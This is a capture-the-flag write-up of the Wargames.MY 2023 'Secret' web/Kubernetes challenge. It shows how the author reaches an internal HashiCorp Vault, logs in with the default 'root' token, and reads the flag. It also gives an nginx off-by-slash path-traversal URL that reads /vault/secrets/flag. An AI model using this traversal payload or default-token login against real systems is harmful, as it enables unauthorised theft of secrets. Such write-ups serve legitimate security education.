# Secret

<div class="hidden">
    keywords: Wargames.MY CTF 2023, web, k8s, HashiCorp Vault
</div>

## Series

1. [Warmup](../warmup/)
2. [Status](../status/)
3. **Secret**

## TL;DR
Read secret from HashiCorp vault using the `vault` CLI and using `nginx` off-by-slash

## Initial Analysis

From the `nginx` config that we retrieved previously, we could see that
`/internal-secret` is only accessible from `10.42.0.0/16` and our pod IP address
happens to be inside this range.

```nginx
set_real_ip_from  10.42.0.0/16;
real_ip_header    X-Real-IP;    # from traefik

server {
  listen       80;
  server_name  _;

  location / {
    root   /usr/share/nginx/html;
    index  index.html;
  }

  location /static {
    alias       /usr/share/nginx/html/;
    add_header  Cache-Control "private, max-age=3600";
  }

  location /api/ {
    include        /etc/nginx/fastcgi_params;
    fastcgi_index  index.php;
    fastcgi_param  SCRIPT_FILENAME /var/www$fastcgi_script_name;
    fastcgi_pass   wgmy-webtestonetwothree-backend:9000;
  }

  location /internal-secret/ {
    allow  10.42.0.0/16;
    deny   all;

    proxy_pass  http://vault.vault:8200/;
  }
}
```

```console
$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0@if43: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1450 qdisc noqueue state UP
    link/ether be:b6:bd:c6:e7:57 brd ff:ff:ff:ff:ff:ff
    inet 10.42.0.36/24 brd 10.42.0.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::bcb6:bdff:fec6:e757/64 scope link
       valid_lft forever preferred_lft forever
```

## Accessing `/internal-secret/`

If we try to do access it via the frontend IP address from the backend pod,
we could see that it tries to redirect to `/ui/` but then returns `404 Not Found`

```console
$ curl -s -v http://wgmy-webtestonetwothree-frontend.wgmy.svc.cluster.local/internal-secret/
* Host wgmy-webtestonetwothree-frontend.wgmy.svc.cluster.local:80 was resolved.
* IPv6: (none)
* IPv4: 10.43.246.102
*   Trying 10.43.246.102:80...
* Connected to wgmy-webtestonetwothree-frontend.wgmy.svc.cluster.local (10.43.246.102) port 80
> GET /internal-secret/ HTTP/1.1
> Host: wgmy-webtestonetwothree-frontend.wgmy.svc.cluster.local
> User-Agent: curl/8.5.0
> Accept: */*
>
< HTTP/1.1 307 Temporary Redirect
< Server: nginx/1.25.3
< Date: Sun, 17 Dec 2023 02:53:35 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 40
< Connection: keep-alive
< Cache-Control: no-store
< Location: /ui/
< Strict-Transport-Security: max-age=31536000; includeSubDomains
<
{ [40 bytes data]
<a href="/ui/">Temporary Redirect</a>.

* Connection #0 to host wgmy-webtestonetwothree-frontend.wgmy.svc.cluster.local left intact

$ curl -s -v -L http://wgmy-webtestonetwothree-frontend.wgmy.svc.cluster.local/internal-secret/
* Host wgmy-webtestonetwothree-frontend.wgmy.svc.cluster.local:80 was resolved.
* IPv6: (none)
* IPv4: 10.43.246.102
*   Trying 10.43.246.102:80...
* Connected to wgmy-webtestonetwothree-frontend.wgmy.svc.cluster.local (10.43.246.102) port 80
> GET /internal-secret/ HTTP/1.1
> Host: wgmy-webtestonetwothree-frontend.wgmy.svc.cluster.local
> User-Agent: curl/8.5.0
> Accept: */*
>
< HTTP/1.1 307 Temporary Redirect
< Server: nginx/1.25.3
< Date: Sun, 17 Dec 2023 02:53:40 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 40
< Connection: keep-alive
< Cache-Control: no-store
< Location: /ui/
< Strict-Transport-Security: max-age=31536000; includeSubDomains
<
* Ignoring the response-body
* Connection #0 to host wgmy-webtestonetwothree-frontend.wgmy.svc.cluster.local left intact
* Issue another request to this URL: 'http://wgmy-webtestonetwothree-frontend.wgmy.svc.cluster.local/ui/'
* Found bundle for host: 0x7fb7009e00e0 [serially]
* Can not multiplex, even if we wanted to
* Re-using existing connection with host wgmy-webtestonetwothree-frontend.wgmy.svc.cluster.local
> GET /ui/ HTTP/1.1
> Host: wgmy-webtestonetwothree-frontend.wgmy.svc.cluster.local
> User-Agent: curl/8.5.0
> Accept: */*
>
< HTTP/1.1 404 Not Found
< Server: nginx/1.25.3
< Date: Sun, 17 Dec 2023 02:53:40 GMT
< Content-Type: text/html
< Content-Length: 153
< Connection: keep-alive
<
{ [153 bytes data]
<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx/1.25.3</center>
</body>
</html>
* Connection #0 to host wgmy-webtestonetwothree-frontend.wgmy.svc.cluster.local left intact
```

If we instead directly access `http://vault.vault:8200`, we could see some result.
However, there is nothing much interesting from the return page. Recall from previous
deployments data, we could see there is `vault.hashicorp.com` which hints me to
research more about `hashicorp vault kubernetes` on google. Link to the findings can
be found [here](#references)

## Interacting with the Vault

The next thing to do is to download the [vault CLI standalone binary](https://developer.hashicorp.com/vault/install#Linux)
to the k8s pod.

```console
$ wget https://releases.hashicorp.com/vault/1.15.4/vault_1.15.4_linux_amd64.zip
Connecting to releases.hashicorp.com (18.155.68.21:443)
saving to 'vault_1.15.4_linux_amd64.zip'
vault_1.15.4_linux_a   0% |                                | 54115  0:41:24 ETA
vault_1.15.4_linux_a 100% |********************************|  128M  0:00:00 ETA
'vault_1.15.4_linux_amd64.zip' saved

$ unzip *.zip
Archive:  vault_1.15.4_linux_amd64.zip
  inflating: vault

$ chmod +x vault

$ ./vault --version
Vault v1.15.4 (9b61934559ba31150860e618cf18e816cbddc630), built 2023-12-04T17:45:28Z
```

Next, we set the environment variable `VAULT_ADDR` and authenticate. I actually
got lucky on trying to login with `root` as the argument.

```console
$ export VAULT_ADDR=http://vault.vault:8200

$ ./vault login root
Success! You are now authenticated. The token information displayed below
is already stored in the token helper. You do NOT need to run "vault login"
again. Future Vault requests will automatically use this token.

Key                  Value
---                  -----
token                root
token_accessor       aPpqqqicK0QC4ZW9t1hZ244c
token_duration       ∞
token_renewable      false
token_policies       ["root"]
identity_policies    []
policies             ["root"]

$ ./vault read kv/data/flag_for_secret
Key         Value
---         -----
data        map[flag_for_secret:wgmy{352ce22be3caed452e616b655db7cb20}]
metadata    map[created_time:2023-12-15T13:42:49.553430131Z custom_metadata:<nil> deletion_time: destroyed:false version:1]
```

flag: `wgmy{352ce22be3caed452e616b655db7cb20}`

## Alternative Solution

Based on this [link](https://developer.hashicorp.com/vault/tutorials/kubernetes/kubernetes-sidecar#inject-secrets-into-the-pod),
the secret is injected somewhere in the filesystem.

> `vault.hashicorp.com/agent-inject-secret-database-config.txt: 'internal/data/database/config'`
>
> `agent-inject-secret-FILEPATH` prefixes the path of the file, `database-config.txt` written to the `/vault/secrets` directory. The value is the path to the secret defined in Vault. 

Thus, looking at the deployments metadata, we could see that the flag could be
retrieved from `/vault/secrets/flag` by leveraging the previous `nginx` misconfiguration LFI.

```yaml
        vault.hashicorp.com/agent-inject: "true"
        vault.hashicorp.com/agent-inject-secret-flag: kv/data/flag_for_secret
        vault.hashicorp.com/role: wgmy
```

Payload:

```text
http://warmup.wargames.my/static../../../../../../../../vault/secrets/flag
```

## References

- <https://www.digitalocean.com/community/tutorials/how-to-securely-manage-secrets-with-hashicorp-vault-on-ubuntu-20-04>
- <https://developer.hashicorp.com/vault/tutorials/kubernetes/kubernetes-sidecar>
- <https://developer.hashicorp.com/vault/install#Linux>
- <https://developer.hashicorp.com/vault/tutorials/getting-started/getting-started-authentication>
